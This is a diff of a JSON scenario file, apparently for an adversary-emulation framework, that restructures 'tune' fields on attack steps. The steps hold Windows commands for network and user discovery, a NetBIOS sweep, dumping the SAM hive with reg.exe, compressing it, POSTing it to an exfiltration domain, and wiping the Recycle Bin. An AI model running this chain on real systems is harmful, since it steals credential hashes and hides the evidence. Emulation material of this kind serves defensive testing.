@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,7 +70,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -76,7 +82,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -87,7 +94,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_low"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "PrivilegeEscalation",
@@ -99,7 +107,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_low",
                 "target_2": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -109,10 +118,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -122,10 +131,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c (ipconfig/all&echo[[S]&cd&echo[[E])"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c (ipconfig/all&echo[[S]&cd&echo[[E])"
             }
         },
         {
@@ -135,10 +144,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{route print; echo \"[S]\"; cd; echo \"[E]\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{route print; echo \"[S]\"; cd; echo \"[E]\"}"
             }
         },
         {
@@ -148,10 +157,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$nbt_start = @(); $nbt_loc = @(); ipconfig | findstr \"IPv4 Address\" | findstr -v \"10.10.\" |findstr \"10\\. 172\\. 192\\.168\\.\" | ForEach-Object {$nbt_s = $_.split(\":\").Trim()[1].split(\".\")[3]-10; $nbt_start += [math]::max(1, $nbt_s); $nbt_loc += $_.substring(0, $_.LastIndexOf('.')).split(\":\")[1].Trim()}; for ($c=0; $c -lt $nbt_loc.length; $c++) {for ($i=$nbt_start[$c]; $i -le [int]$nbt_start[$c]+20; $i=$i+1 ) {$nbt = $nbt_loc[$c]; start-job -arg $nbt,$i -ScriptBlock {param($nbt_loc,$i); echo \"$nbt_loc.$i\"; $match = nbtstat -A \"$nbt_loc.$i\" | select-string \"UNIQUE\" -context 2;$match.line+$match.context.displaypostcontext}>$null};get-job | wait-job >$null; get-job | receive-job; get-job | Remove-Job }}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$nbt_start = @(); $nbt_loc = @(); ipconfig | findstr \"IPv4 Address\" | findstr -v \"10.10.\" |findstr \"10\\. 172\\. 192\\.168\\.\" | ForEach-Object {$nbt_s = $_.split(\":\").Trim()[1].split(\".\")[3]-10; $nbt_start += [math]::max(1, $nbt_s); $nbt_loc += $_.substring(0, $_.LastIndexOf('.')).split(\":\")[1].Trim()}; for ($c=0; $c -lt $nbt_loc.length; $c++) {for ($i=$nbt_start[$c]; $i -le [int]$nbt_start[$c]+20; $i=$i+1 ) {$nbt = $nbt_loc[$c]; start-job -arg $nbt,$i -ScriptBlock {param($nbt_loc,$i); echo \"$nbt_loc.$i\"; $match = nbtstat -A \"$nbt_loc.$i\" | select-string \"UNIQUE\" -context 2;$match.line+$match.context.displaypostcontext}>$null};get-job | wait-job >$null; get-job | receive-job; get-job | Remove-Job }}"
             }
         },
         {
@@ -161,10 +170,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{query user; echo \"[S]\"; cd; echo \"[E]\"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{query user; echo \"[S]\"; cd; echo \"[E]\"}"
             }
         },
         {
@@ -174,10 +183,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c whoami&echo[[S]&cd&echo[[E]"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c whoami&echo[[S]&cd&echo[[E]"
             }
         },
         {
@@ -187,10 +196,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c netstat/oan&echo[[S]&cd&echo[[E]"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c netstat/oan&echo[[S]&cd&echo[[E]"
             }
         },
         {
@@ -200,10 +209,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c systeminfo&echo[[S]&cd&echo[[E]"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c systeminfo&echo[[S]&cd&echo[[E]"
             }
         },
         {
@@ -213,18 +222,18 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": {
-                        "template": [
-                            "reg.exe save hklm\\sam",
-                            {
-                                "kind": "slice",
-                                "slice": 0,
-                                "value": "self.exfil_file"
-                            }
-                        ]
-                    }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": {
+                    "template": [
+                        "reg.exe save hklm\\sam",
+                        {
+                            "kind": "slice",
+                            "slice": 0,
+                            "value": "self.exfil_file"
+                        }
+                    ]
                 }
             }
         },
@@ -235,10 +244,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell Compress-Archive c:\\`$recycle.bin\\sam.hiv c:\\`$recycle.bin\\sam.zip; move c:\\`$recycle.bin\\sam.zip c:\\`$recycle.bin\\sam.rar"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell Compress-Archive c:\\`$recycle.bin\\sam.hiv c:\\`$recycle.bin\\sam.zip; move c:\\`$recycle.bin\\sam.zip c:\\`$recycle.bin\\sam.rar"
             }
         },
         {
@@ -249,10 +258,10 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
-                "exfil": "self.exfil",
-                "tune": {
-                    "command": "powershell &{Invoke-RestMethod -Uri${self.exfil_domain}-Method Post -InFile c:\\`$recycle.bin\\sam.rar;echo \" \"}"
-                }
+                "exfil": "self.exfil"
+            },
+            "tune": {
+                "command": "powershell &{Invoke-RestMethod -Uri${self.exfil_domain}-Method Post -InFile c:\\`$recycle.bin\\sam.rar;echo \" \"}"
             }
         },
         {
@@ -262,10 +271,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c del * C:\\$Recycle.Bin /q; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c del * C:\\$Recycle.Bin /q; echo \" \"}"
             }
         },
         {
@@ -276,7 +285,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -286,7 +296,8 @@
                 "agent": "self.agent_tgt1_low",
                 "tool": "self.tool",
                 "target": "self.target_1_low"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
